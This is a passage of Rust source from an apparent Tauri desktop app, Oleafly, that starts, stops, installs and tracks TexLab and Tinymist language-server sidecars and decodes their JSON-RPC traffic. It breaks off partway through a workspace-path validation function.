mod server_runtime;

use rand::{rngs::OsRng, RngCore};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::{HashMap, VecDeque};
use std::path::{Path, PathBuf};
use std::process::{ExitStatus, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU32, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex, MutexGuard};
use std::time::Duration;
use tauri::ipc::Channel;
use tauri::path::BaseDirectory;
use tauri::{AppHandle, Manager, RunEvent, Runtime, State};
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWriteExt};
use tokio::sync::{mpsc, watch};

use crate::paths;
use crate::proc::{
    contain_process_tree, isolate_process_tree, terminate_process_tree, NoConsole, ProcessTreeGuard,
};
use server_runtime::{InstallOutcome, InstallStatus, InstallerState};

const MAX_MESSAGE_BYTES: usize = 16 * 1024 * 1024;
const MAX_HEADER_BYTES: usize = 8 * 1024;
const MAX_STDERR_BYTES: usize = 256 * 1024;
const STDERR_CHUNK_BYTES: usize = 8 * 1024;
const MAX_ACTIVE_SESSIONS: usize = 4;
const MAX_TERMINAL_SESSIONS: usize = 32;
const OUTBOUND_QUEUE_DEPTH: usize = 4;
const MAX_OUTBOUND_QUEUE_BYTES: usize = 2 * MAX_MESSAGE_BYTES;
const STOP_TIMEOUT: Duration = Duration::from_secs(8);
const PIPE_DRAIN_TIMEOUT: Duration = Duration::from_secs(1);
const PROCESS_KILL_TIMEOUT: Duration = Duration::from_secs(2);

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Deserialize, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum LanguageServiceKind {
    #[serde(rename = "texlab")]
    TexLab,
    Tinymist,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum LanguageServiceStatus {
    Running,
    Stopping,
    Exited,
    Stopped,
    Failed,
}

impl LanguageServiceStatus {
    const fn is_terminal(self) -> bool {
        matches!(self, Self::Exited | Self::Stopped | Self::Failed)
    }
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct StartLanguageServiceRequest {
    pub kind: LanguageServiceKind,
    pub project_id: String,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct LanguageServiceSessionRequest {
    pub session: String,
    pub generation: u64,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct SendLanguageServiceRequest {
    pub session: String,
    pub generation: u64,
    pub message: Value,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct StartLanguageServiceResponse {
    pub session: String,
    pub kind: LanguageServiceKind,
    pub generation: u64,
    pub project_id: String,
    pub workspace_root: String,
    pub status: LanguageServiceStatus,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SendLanguageServiceResponse {
    pub session: String,
    pub kind: LanguageServiceKind,
    pub generation: u64,
    pub accepted: bool,
    pub message_bytes: usize,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct StopLanguageServiceResponse {
    pub session: String,
    pub kind: LanguageServiceKind,
    pub generation: u64,
    pub status: LanguageServiceStatus,
    pub already_stopped: bool,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LanguageServiceStatusResponse {
    pub session: String,
    pub kind: LanguageServiceKind,
    pub generation: u64,
    pub project_id: String,
    pub workspace_root: String,
    pub status: LanguageServiceStatus,
    pub exit_code: Option<i32>,
    pub signal: Option<i32>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum LanguageServiceErrorCode {
    InvalidWorkspace,
    DuplicateSession,
    SidecarUnavailable,
    SidecarSetupRequired,
    ManifestInvalid,
    DownloadFailed,
    IntegrityFailure,
    InstallFailed,
    SessionLimit,
    SessionNotFound,
    SessionNotRunning,
    GenerationMismatch,
    InvalidMessage,
    Backpressure,
    TransportClosed,
    StopTimeout,
    AppShuttingDown,
    Internal,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LanguageServiceError {
    pub code: LanguageServiceErrorCode,
    pub message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub kind: Option<LanguageServiceKind>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub version: Option<String>,
}

impl LanguageServiceError {
    fn new(code: LanguageServiceErrorCode, message: impl Into<String>) -> Self {
        Self {
            code,
            message: message.into(),
            kind: None,
            version: None,
        }
    }

    fn setup_required(
        kind: LanguageServiceKind,
        version: String,
        message: impl Into<String>,
    ) -> Self {
        Self {
            code: LanguageServiceErrorCode::SidecarSetupRequired,
            message: message.into(),
            kind: Some(kind),
            version: Some(version),
        }
    }
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct InstallLanguageServiceRequest {
    pub kind: LanguageServiceKind,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum InstallLanguageServiceState {
    Installed,
    AlreadyInstalled,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InstallLanguageServiceResponse {
    pub kind: LanguageServiceKind,
    pub version: String,
    pub state: InstallLanguageServiceState,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum LanguageServiceInstallState {
    Installed,
    Missing,
    Installing,
    Failed,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LanguageServiceInstallStatusResponse {
    pub kind: LanguageServiceKind,
    pub version: String,
    pub state: LanguageServiceInstallState,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LanguageServiceEvent {
    pub session: String,
    pub kind: LanguageServiceKind,
    pub generation: u64,
    pub sequence: u64,
    #[serde(flatten)]
    pub payload: LanguageServiceEventPayload,
}

#[derive(Debug, Clone, Serialize)]
#[serde(
    tag = "event",
    rename_all = "snake_case",
    rename_all_fields = "camelCase"
)]
pub enum LanguageServiceEventPayload {
    Started {
        project_id: String,
        workspace_root: String,
    },
    Message {
        message: Value,
    },
    Stderr {
        text: String,
    },
    StderrTruncated {
        limit_bytes: usize,
    },
    ProtocolError {
        code: ProtocolErrorCode,
        message: String,
    },
    TransportError {
        stream: TransportStream,
        message: String,
    },
    Exited {
        status: LanguageServiceStatus,
        exit_code: Option<i32>,
        signal: Option<i32>,
        reason: String,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ProtocolErrorCode {
    HeaderTooLarge,
    InvalidHeader,
    MissingContentLength,
    DuplicateContentLength,
    InvalidContentLength,
    MessageTooLarge,
    InvalidUtf8,
    InvalidJson,
    InvalidJsonRpc,
    UnexpectedEof,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum TransportStream {
    Stdin,
    Stdout,
    Stderr,
}

#[derive(Debug, Clone)]
struct SessionMeta {
    session: String,
    kind: LanguageServiceKind,
    generation: u64,
}

#[derive(Clone)]
struct SessionRecord {
    meta: SessionMeta,
    owner_label: String,
    project_id: String,
    workspace_root: PathBuf,
    workspace_display: String,
    status: watch::Sender<LanguageServiceStatus>,
    stop: watch::Sender<bool>,
    outbound: mpsc::Sender<OutboundFrame>,
    queued_bytes: Arc<AtomicUsize>,
    pid: Arc<AtomicU32>,
    events: EventHub,
}

impl SessionRecord {
    fn status(&self) -> LanguageServiceStatus {
        *self.status.borrow()
    }

    fn response(&self) -> StartLanguageServiceResponse {
        StartLanguageServiceResponse {
            session: self.meta.session.clone(),
            kind: self.meta.kind,
            generation: self.meta.generation,
            project_id: self.project_id.clone(),
            workspace_root: self.workspace_display.clone(),
            status: self.status(),
        }
    }
}

#[derive(Clone)]
struct TerminalSession {
    meta: SessionMeta,
    project_id: String,
    workspace_display: String,
    status: LanguageServiceStatus,
    exit_code: Option<i32>,
    signal: Option<i32>,
}

impl TerminalSession {
    fn status_response(&self) -> LanguageServiceStatusResponse {
        LanguageServiceStatusResponse {
            session: self.meta.session.clone(),
            kind: self.meta.kind,
            generation: self.meta.generation,
            project_id: self.project_id.clone(),
            workspace_root: self.workspace_display.clone(),
            status: self.status,
            exit_code: self.exit_code,
            signal: self.signal,
        }
    }
}

#[derive(Default)]
struct RegistryInner {
    active: HashMap<String, SessionRecord>,
    terminal: VecDeque<TerminalSession>,
    generation: u64,
}

#[derive(Default)]
struct Registry {
    inner: Mutex<RegistryInner>,
    shutting_down: AtomicBool,
}

#[derive(Clone, Default)]
pub struct LanguageServiceState {
    registry: Arc<Registry>,
    installer: Arc<InstallerState>,
    // Starting is intentionally serialized. Besides keeping the session limit
    // deterministic, this lets a newly mounted frontend reclaim a project
    // whose previous WebView/runtime disappeared before it could send `stop`.
    start_gate: Arc<tokio::sync::Mutex<()>>,
}

#[derive(Clone)]
struct EventHub {
    meta: SessionMeta,
    inner: Arc<Mutex<EventHubInner>>,
}

struct EventHubInner {
    channel: Option<Channel<LanguageServiceEvent>>,
    next_sequence: u64,
}

impl EventHub {
    fn new(meta: SessionMeta, subscriber: Channel<LanguageServiceEvent>) -> Self {
        Self {
            meta,
            inner: Arc::new(Mutex::new(EventHubInner {
                channel: Some(subscriber),
                next_sequence: 1,
            })),
        }
    }

    fn emit(&self, payload: LanguageServiceEventPayload) -> bool {
        let mut inner = lock_unpoisoned(&self.inner);
        let event = self.next_event(&mut inner, payload);
        let sent = inner
            .channel
            .as_ref()
            .map(|channel| channel.send(event).is_ok())
            .unwrap_or(false);
        if !sent {
            inner.channel = None;
        }
        sent
    }

    fn next_event(
        &self,
        inner: &mut EventHubInner,
        payload: LanguageServiceEventPayload,
    ) -> LanguageServiceEvent {
        let sequence = inner.next_sequence;
        inner.next_sequence = inner.next_sequence.saturating_add(1);
        LanguageServiceEvent {
            session: self.meta.session.clone(),
            kind: self.meta.kind,
            generation: self.meta.generation,
            sequence,
            payload,
        }
    }
}

struct OutboundFrame {
    bytes: Vec<u8>,
    queued_bytes: Arc<AtomicUsize>,
}

impl Drop for OutboundFrame {
    fn drop(&mut self) {
        self.queued_bytes
            .fetch_sub(self.bytes.len(), Ordering::AcqRel);
    }
}

struct SpawnedSession {
    child: tokio::process::Child,
    stdin: tokio::process::ChildStdin,
    stdout: tokio::process::ChildStdout,
    stderr: tokio::process::ChildStderr,
    pid: u32,
    containment: ProcessTreeGuard,
}

struct SessionRuntime {
    registry: Arc<Registry>,
    record: SessionRecord,
    child: tokio::process::Child,
    stdin: tokio::process::ChildStdin,
    stdout: tokio::process::ChildStdout,
    stderr: tokio::process::ChildStderr,
    containment: ProcessTreeGuard,
    outbound_rx: mpsc::Receiver<OutboundFrame>,
    stop_rx: watch::Receiver<bool>,
}

#[derive(Debug)]
struct ProcessOutcome {
    status: LanguageServiceStatus,
    exit_code: Option<i32>,
    signal: Option<i32>,
    reason: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ProtocolFailure {
    code: ProtocolErrorCode,
    message: String,
}

#[derive(Debug)]
enum StdoutFailure {
    Protocol(ProtocolFailure),
    Io(String),
    ChannelClosed,
}

#[derive(Debug)]
enum StderrFailure {
    Io(String),
    ChannelClosed,
}

impl ProtocolFailure {
    fn new(code: ProtocolErrorCode, message: impl Into<String>) -> Self {
        Self {
            code,
            message: message.into(),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DecoderState {
    Headers,
    Body { content_length: usize },
}

struct JsonRpcDecoder {
    buffer: Vec<u8>,
    state: DecoderState,
}

impl Default for JsonRpcDecoder {
    fn default() -> Self {
        Self {
            buffer: Vec::new(),
            state: DecoderState::Headers,
        }
    }
}

impl JsonRpcDecoder {
    fn push(&mut self, chunk: &[u8]) -> Result<Vec<Value>, ProtocolFailure> {
        self.buffer.extend_from_slice(chunk);
        let mut messages = Vec::new();

        loop {
            match self.state {
                DecoderState::Headers => {
                    let Some(header_end) = find_bytes(&self.buffer, b"\r\n\r\n") else {
                        validate_partial_header_line_endings(&self.buffer)?;
                        if self.buffer.len() > MAX_HEADER_BYTES {
                            return Err(ProtocolFailure::new(
                                ProtocolErrorCode::HeaderTooLarge,
                                format!(
                                    "JSON-RPC header exceeds the {MAX_HEADER_BYTES}-byte limit"
                                ),
                            ));
                        }
                        break;
                    };

                    if header_end > MAX_HEADER_BYTES {
                        return Err(ProtocolFailure::new(
                            ProtocolErrorCode::HeaderTooLarge,
                            format!("JSON-RPC header exceeds the {MAX_HEADER_BYTES}-byte limit"),
                        ));
                    }
                    let content_length = parse_content_length(&self.buffer[..header_end])?;
                    self.buffer.drain(..header_end + 4);
                    self.state = DecoderState::Body { content_length };
                }
                DecoderState::Body { content_length } => {
                    if self.buffer.len() < content_length {
                        break;
                    }
                    let body: Vec<u8> = self.buffer.drain(..content_length).collect();
                    let text = std::str::from_utf8(&body).map_err(|_| {
                        ProtocolFailure::new(
                            ProtocolErrorCode::InvalidUtf8,
                            "JSON-RPC message body is not valid UTF-8",
                        )
                    })?;
                    let message: Value = serde_json::from_str(text).map_err(|error| {
                        ProtocolFailure::new(
                            ProtocolErrorCode::InvalidJson,
                            format!("JSON-RPC message body is not valid JSON: {error}"),
                        )
                    })?;
                    validate_json_rpc_value(&message).map_err(|message| {
                        ProtocolFailure::new(ProtocolErrorCode::InvalidJsonRpc, message)
                    })?;
                    messages.push(message);
                    self.state = DecoderState::Headers;
                }
            }
        }

        Ok(messages)
    }

    fn finish(&self) -> Result<(), ProtocolFailure> {
        if self.buffer.is_empty() && self.state == DecoderState::Headers {
            Ok(())
        } else {
            Err(ProtocolFailure::new(
                ProtocolErrorCode::UnexpectedEof,
                "language server closed stdout in the middle of a JSON-RPC frame",
            ))
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Admission {
    Available,
    Duplicate,
    AtCapacity,
}

#[tauri::command]
pub async fn language_service_start(
    app: AppHandle,
    window: tauri::WebviewWindow,
    state: State<'_, LanguageServiceState>,
    request: StartLanguageServiceRequest,
    on_event: Channel<LanguageServiceEvent>,
) -> Result<StartLanguageServiceResponse, LanguageServiceError> {
    let _start_guard = state.start_gate.lock().await;
    if state.registry.shutting_down.load(Ordering::Acquire) {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::AppShuttingDown,
            "cannot start a language service while the application is shutting down",
        ));
    }

    let workspace_root = resolve_project_workspace(&request.project_id)?;
    let workspace_display = workspace_root.to_str().map(str::to_owned).ok_or_else(|| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidWorkspace,
            "workspace root must be representable as UTF-8",
        )
    })?;
    let app_local_data = app.path().app_local_data_dir().map_err(|_| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::SidecarUnavailable,
            "Oleafly app-local-data directory is unavailable",
        )
    })?;
    let resource = bundled_resource_paths(&app, request.kind)?;
    let installer = state.installer.clone();
    let kind = request.kind;
    let launch = tauri::async_runtime::spawn_blocking(move || {
        server_runtime::resolve_for_launch(&app_local_data, &installer, kind, resource.as_ref())
    })
    .await
    .map_err(language_service_worker_error)??;

    // A WebView reload, failed deferred-module load, renderer crash, or
    // development HMR can destroy the only holder of the opaque session id
    // before its asynchronous cleanup command runs. Sessions belong to the
    // Tauri window that created them, so a newly mounted runtime must reclaim
    // every session left by the previous runtime in that same window. Using
    // the native window label avoids trusting a caller-provided owner id and
    // preserves the global cap for genuinely independent windows.
    let owner_label = window.label().to_owned();
    let displaced = {
        let registry = lock_unpoisoned(&state.registry.inner);
        registry
            .active
            .values()
            .filter(|record| record.owner_label == owner_label)
            .cloned()
            .collect::<Vec<_>>()
    };
    for record in displaced {
        stop_session_record(&record).await?;
    }

    let mut registry = lock_unpoisoned(&state.registry.inner);
    if state.registry.shutting_down.load(Ordering::Acquire) {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::AppShuttingDown,
            "cannot start a language service while the application is shutting down",
        ));
    }
    let admission = admission_decision(
        registry
            .active
            .values()
            .map(|record| (record.meta.kind, record.workspace_root.as_path())),
        request.kind,
        &workspace_root,
        registry.active.len(),
    );

    if admission == Admission::Duplicate {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::DuplicateSession,
            "an exclusive language-service session already owns this project and server kind",
        ));
    }

    if admission == Admission::AtCapacity {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::SessionLimit,
            format!("at most {MAX_ACTIVE_SESSIONS} language-service sessions may run at once"),
        ));
    }

    registry.generation = registry.generation.checked_add(1).ok_or_else(|| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::Internal,
            "language-service generation counter is exhausted",
        )
    })?;
    let meta = SessionMeta {
        session: allocate_session_id(&registry),
        kind: request.kind,
        generation: registry.generation,
    };
    let spawned = spawn_sidecar(&launch.executable, &launch.args, &workspace_root)?;
    let (outbound, outbound_rx) = mpsc::channel(OUTBOUND_QUEUE_DEPTH);
    let (stop, stop_rx) = watch::channel(false);
    let (status, _) = watch::channel(LanguageServiceStatus::Running);
    let events = EventHub::new(meta.clone(), on_event);
    let pid = Arc::new(AtomicU32::new(spawned.pid));
    let record = SessionRecord {
        meta: meta.clone(),
        owner_label,
        project_id: request.project_id,
        workspace_root,
        workspace_display,
        status,
        stop,
        outbound,
        queued_bytes: Arc::new(AtomicUsize::new(0)),
        pid,
        events,
    };
    registry.active.insert(meta.session.clone(), record.clone());
    let response = record.response();
    drop(registry);

    if !record.events.emit(LanguageServiceEventPayload::Started {
        project_id: record.project_id.clone(),
        workspace_root: record.workspace_display.clone(),
    }) {
        stop_spawned_session_now(spawned);
        remove_active_session(&state.registry, &record.meta);
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::TransportClosed,
            "language-service event channel closed before startup completed",
        ));
    }

    tauri::async_runtime::spawn(run_session(SessionRuntime {
        registry: state.registry.clone(),
        record,
        child: spawned.child,
        stdin: spawned.stdin,
        stdout: spawned.stdout,
        stderr: spawned.stderr,
        containment: spawned.containment,
        outbound_rx,
        stop_rx,
    }));

    Ok(response)
}

#[tauri::command]
pub async fn language_service_send(
    state: State<'_, LanguageServiceState>,
    request: SendLanguageServiceRequest,
) -> Result<SendLanguageServiceResponse, LanguageServiceError> {
    validate_session_reference(&request.session, request.generation)?;
    let (frame, message_bytes) = encode_json_rpc(&request.message)?;
    let record =
        lookup_active_session(&state.registry, &request.session, request.generation, true)?;
    if record.status() != LanguageServiceStatus::Running {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::SessionNotRunning,
            format!(
                "language-service session is {}",
                status_label(record.status())
            ),
        ));
    }

    reserve_outbound_bytes(&record.queued_bytes, frame.len())?;
    let outbound = OutboundFrame {
        bytes: frame,
        queued_bytes: record.queued_bytes.clone(),
    };
    match record.outbound.try_send(outbound) {
        Ok(()) => Ok(SendLanguageServiceResponse {
            session: record.meta.session,
            kind: record.meta.kind,
            generation: record.meta.generation,
            accepted: true,
            message_bytes,
        }),
        Err(mpsc::error::TrySendError::Full(_frame)) => Err(LanguageServiceError::new(
            LanguageServiceErrorCode::Backpressure,
            "language-service outbound queue is full",
        )),
        Err(mpsc::error::TrySendError::Closed(_frame)) => Err(LanguageServiceError::new(
            LanguageServiceErrorCode::TransportClosed,
            "language-service stdin is closed",
        )),
    }
}

#[tauri::command]
pub async fn language_service_stop(
    state: State<'_, LanguageServiceState>,
    request: LanguageServiceSessionRequest,
) -> Result<StopLanguageServiceResponse, LanguageServiceError> {
    validate_session_reference(&request.session, request.generation)?;
    let lookup = lookup_session(&state.registry, &request.session, request.generation)?;
    let SessionLookup::Active(record) = lookup else {
        let SessionLookup::Terminal(terminal) = lookup else {
            unreachable!();
        };
        return Ok(StopLanguageServiceResponse {
            session: terminal.meta.session,
            kind: terminal.meta.kind,
            generation: terminal.meta.generation,
            status: terminal.status,
            already_stopped: true,
        });
    };

    let previous = record.status();
    let already_stopped = previous != LanguageServiceStatus::Running;
    let terminal_status = stop_session_record(&record).await?;

    Ok(StopLanguageServiceResponse {
        session: record.meta.session,
        kind: record.meta.kind,
        generation: record.meta.generation,
        status: terminal_status,
        already_stopped,
    })
}

async fn stop_session_record(
    record: &SessionRecord,
) -> Result<LanguageServiceStatus, LanguageServiceError> {
    let current = record.status();
    if current.is_terminal() {
        return Ok(current);
    }
    if current == LanguageServiceStatus::Running {
        record.status.send_replace(LanguageServiceStatus::Stopping);
    }
    let mut status_rx = record.status.subscribe();
    let _ = record.stop.send(true);

    tokio::time::timeout(STOP_TIMEOUT, async {
        loop {
            let current = *status_rx.borrow();
            if current.is_terminal() {
                break current;
            }
            if status_rx.changed().await.is_err() {
                break *status_rx.borrow();
            }
        }
    })
    .await
    .map_err(|_| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::StopTimeout,
            "timed out waiting for the language-service process to stop",
        )
    })
}

#[tauri::command]
pub async fn language_service_status(
    state: State<'_, LanguageServiceState>,
    request: LanguageServiceSessionRequest,
) -> Result<LanguageServiceStatusResponse, LanguageServiceError> {
    validate_session_reference(&request.session, request.generation)?;
    match lookup_session(&state.registry, &request.session, request.generation)? {
        SessionLookup::Active(record) => {
            let status = record.status();
            Ok(LanguageServiceStatusResponse {
                session: record.meta.session,
                kind: record.meta.kind,
                generation: record.meta.generation,
                project_id: record.project_id,
                workspace_root: record.workspace_display,
                status,
                exit_code: None,
                signal: None,
            })
        }
        SessionLookup::Terminal(terminal) => Ok(terminal.status_response()),
    }
}

#[tauri::command]
pub async fn language_service_install(
    app: AppHandle,
    state: State<'_, LanguageServiceState>,
    request: InstallLanguageServiceRequest,
) -> Result<InstallLanguageServiceResponse, LanguageServiceError> {
    let app_local_data = app.path().app_local_data_dir().map_err(|_| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::InstallFailed,
            "Oleafly app-local-data directory is unavailable",
        )
    })?;
    let resource = bundled_resource_paths(&app, request.kind)?;
    let (version, outcome) = match request.kind {
        LanguageServiceKind::TexLab => {
            server_runtime::install_texlab(app_local_data, state.installer.clone()).await?
        }
        LanguageServiceKind::Tinymist => {
            let installer = state.installer.clone();
            let resource = resource.ok_or_else(|| {
                LanguageServiceError::new(
                    LanguageServiceErrorCode::SidecarUnavailable,
                    "the pinned Tinymist resource archive path is unavailable",
                )
            })?;
            tauri::async_runtime::spawn_blocking(move || {
                server_runtime::install_tinymist(&app_local_data, &installer, &resource)
            })
            .await
            .map_err(language_service_worker_error)??
        }
    };
    Ok(InstallLanguageServiceResponse {
        kind: request.kind,
        version,
        state: match outcome {
            InstallOutcome::Installed => InstallLanguageServiceState::Installed,
            InstallOutcome::AlreadyInstalled => InstallLanguageServiceState::AlreadyInstalled,
        },
    })
}

#[tauri::command]
pub async fn language_service_install_status(
    app: AppHandle,
    state: State<'_, LanguageServiceState>,
    request: InstallLanguageServiceRequest,
) -> Result<LanguageServiceInstallStatusResponse, LanguageServiceError> {
    let app_local_data = app.path().app_local_data_dir().map_err(|_| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::InstallFailed,
            "Oleafly app-local-data directory is unavailable",
        )
    })?;
    let resource = bundled_resource_paths(&app, request.kind)?;
    let installer = state.installer.clone();
    let kind = request.kind;
    let (version, status) = tauri::async_runtime::spawn_blocking(move || {
        server_runtime::install_status(&app_local_data, &installer, kind, resource.as_ref())
    })
    .await
    .map_err(language_service_worker_error)??;
    let (status, message) = match status {
        InstallStatus::Installed => (LanguageServiceInstallState::Installed, None),
        InstallStatus::Missing => (LanguageServiceInstallState::Missing, None),
        InstallStatus::Installing => (LanguageServiceInstallState::Installing, None),
        InstallStatus::Failed(message) => (LanguageServiceInstallState::Failed, Some(message)),
    };
    Ok(LanguageServiceInstallStatusResponse {
        kind: request.kind,
        version,
        state: status,
        message,
    })
}

fn bundled_resource_paths(
    app: &AppHandle,
    kind: LanguageServiceKind,
) -> Result<Option<server_runtime::BundledResourcePaths>, LanguageServiceError> {
    let Some(relative) = server_runtime::bundled_resource_relative_path(kind)? else {
        return Ok(None);
    };
    // Tauri v2's documented resource API preserves configured resource-relative
    // paths across macOS, Linux, and Windows bundle layouts:
    // https://v2.tauri.app/develop/resources/#resolve-resource-file-paths
    let root = app.path().resource_dir().map_err(|_| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::SidecarUnavailable,
            "Oleafly's bundled resource directory is unavailable",
        )
    })?;
    let archive = app
        .path()
        .resolve(&relative, BaseDirectory::Resource)
        .map_err(|_| {
            LanguageServiceError::new(
                LanguageServiceErrorCode::SidecarUnavailable,
                "the pinned Tinymist resource archive could not be resolved",
            )
        })?;
    Ok(Some(server_runtime::BundledResourcePaths { root, archive }))
}

fn language_service_worker_error(_error: tauri::Error) -> LanguageServiceError {
    LanguageServiceError::new(
        LanguageServiceErrorCode::Internal,
        "the language-service integrity worker did not complete",
    )
}

pub fn lifecycle_plugin<R: Runtime>() -> tauri::plugin::TauriPlugin<R> {
    tauri::plugin::Builder::<R>::new("language-service-lifecycle")
        .on_event(|app, event| {
            if let RunEvent::Exit = event {
                app.state::<LanguageServiceState>().shutdown_all_now();
            }
        })
        .build()
}

impl LanguageServiceState {
    fn shutdown_all_now(&self) {
        if self.registry.shutting_down.swap(true, Ordering::AcqRel) {
            return;
        }
        let records: Vec<SessionRecord> = {
            let registry = lock_unpoisoned(&self.registry.inner);
            registry.active.values().cloned().collect()
        };
        for record in &records {
            if record.status() == LanguageServiceStatus::Running {
                record.status.send_replace(LanguageServiceStatus::Stopping);
            }
            let _ = record.stop.send(true);
        }
        for record in records {
            terminate_process_tree_now(record.pid.load(Ordering::Acquire));
        }
    }
}

enum SessionLookup {
    Active(SessionRecord),
    Terminal(TerminalSession),
}

fn lookup_session(
    registry: &Registry,
    session: &str,
    generation: u64,
) -> Result<SessionLookup, LanguageServiceError> {
    let inner = lock_unpoisoned(&registry.inner);
    if let Some(record) = inner.active.get(session) {
        ensure_generation(&record.meta, generation)?;
        return Ok(SessionLookup::Active(record.clone()));
    }
    if let Some(terminal) = inner
        .terminal
        .iter()
        .rev()
        .find(|terminal| terminal.meta.session == session)
    {
        ensure_generation(&terminal.meta, generation)?;
        return Ok(SessionLookup::Terminal(terminal.clone()));
    }
    Err(LanguageServiceError::new(
        LanguageServiceErrorCode::SessionNotFound,
        "language-service session was not found",
    ))
}

fn lookup_active_session(
    registry: &Registry,
    session: &str,
    generation: u64,
    reject_terminal: bool,
) -> Result<SessionRecord, LanguageServiceError> {
    match lookup_session(registry, session, generation)? {
        SessionLookup::Active(record) => Ok(record),
        SessionLookup::Terminal(terminal) if reject_terminal => Err(LanguageServiceError::new(
            LanguageServiceErrorCode::SessionNotRunning,
            format!(
                "language-service session is {}",
                status_label(terminal.status)
            ),
        )),
        SessionLookup::Terminal(_) => Err(LanguageServiceError::new(
            LanguageServiceErrorCode::SessionNotFound,
            "language-service session is no longer active",
        )),
    }
}

fn ensure_generation(meta: &SessionMeta, generation: u64) -> Result<(), LanguageServiceError> {
    if meta.generation == generation {
        Ok(())
    } else {
        Err(LanguageServiceError::new(
            LanguageServiceErrorCode::GenerationMismatch,
            "language-service session generation does not match",
        ))
    }
}

fn validate_session_reference(session: &str, generation: u64) -> Result<(), LanguageServiceError> {
    let valid_id = session.len() == 35
        && session.starts_with("ls_")
        && session[3..].bytes().all(|byte| byte.is_ascii_hexdigit());
    if !valid_id || generation == 0 {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::SessionNotFound,
            "invalid language-service session reference",
        ));
    }
    Ok(())
}

fn allocate_session_id(registry: &RegistryInner) -> String {
    loop {
        let mut random = [0_u8; 16];
        OsRng.fill_bytes(&mut random);
        let mut id = String::with_capacity(35);
        id.push_str("ls_");
        for byte in random {
            use std::fmt::Write as _;
            let _ = write!(id, "{byte:02x}");
        }
        let active_collision = registry.active.contains_key(&id);
        let terminal_collision = registry
            .terminal
            .iter()
            .any(|terminal| terminal.meta.session == id);
        if !active_collision && !terminal_collision {
            return id;
        }
    }
}

fn admission_decision<'a>(
    mut active: impl Iterator<Item = (LanguageServiceKind, &'a Path)>,
    requested_kind: LanguageServiceKind,
    requested_root: &Path,
    active_count: usize,
) -> Admission {
    if active.any(|(kind, root)| kind == requested_kind && root == requested_root) {
        Admission::Duplicate
    } else if active_count >= MAX_ACTIVE_SESSIONS {
        Admission::AtCapacity
    } else {
        Admission::Available
    }
}

fn resolve_project_workspace(project_id: &str) -> Result<PathBuf, LanguageServiceError> {
    if project_id.len() > 128 {
        return Err(LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidWorkspace,
            "invalid project id",
        ));
    }
    paths::validate_project_id(project_id).map_err(|_| {
        LanguageServiceError::new(
            LanguageServiceErrorCode::InvalidWorkspace,
            "invalid project id",
        )
    })?;
    let projects_root = paths::projects_root()
        .and_then(|root| {
            root.canonicalize()
                .map_err(|_| "failed to resolve projects root".to_owned())
        })
        .map_err(|_| {
            LanguageServiceError::new(
                LanguageServiceErrorCode::InvalidWorkspace,
                "Oleafly projects root is unavailable",
            )
        })?;
    let candidate = projects_root.join(project_id);
    let metadata = std::fs::symlink_metadata(&candidate).map_err(|error| {
        let message = if error.kind() == std::io::ErrorKind::NotFound {
            "project is unknown".to_owned()
        } else {
            "failed to inspect project directory".to_owned()
        };
        LanguageServiceError::new(LanguageServiceErrorCode::InvalidWorkspace, message)
    })?;
    if !metadata.is_dir()
        || metadata.file_type().is_symlink()
        || metadata_is_reparse_point(&metadata)
    {
        return Err(LanguageServiceError::new(
